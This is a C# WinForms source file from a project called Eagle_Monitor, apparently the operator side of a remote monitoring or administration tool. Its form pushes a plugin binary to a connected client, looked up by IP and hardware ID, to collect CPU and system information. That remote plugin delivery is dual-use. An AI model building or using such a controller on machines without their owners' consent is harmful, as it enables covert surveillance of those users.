using Eagle_Monitor.Clients;
using Eagle_Monitor.Controls;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

namespace Eagle_Monitor.Forms
{
    public partial class InformationForm : FormPattern
    {
        public string ClientHWID { get; set; }
        public string IP_Origin { get; set; }
        public bool Is64BitClient { get; set; }

        public InformationForm(string ClientHWID, string IP_Origin, bool Is64BitClient)
        {
            this.ClientHWID = ClientHWID;
            this.IP_Origin = IP_Origin;
            this.Is64BitClient = Is64BitClient;
            InitializeComponent();
        }

        private void InformationForm_Load(object sender, EventArgs e)
        {

        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void getInformationWindowsButton_Click(object sender, EventArgs e)
        {
            byte[] b;
            if (Is64BitClient)
                b = Plugins.CPUInformation_64;
            else
                b = Plugins.CPUInformation;

            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.GET_INFORMATION, b };
            Task.Run(() => C.SendData(D.Serialize()));
        }
    }
}
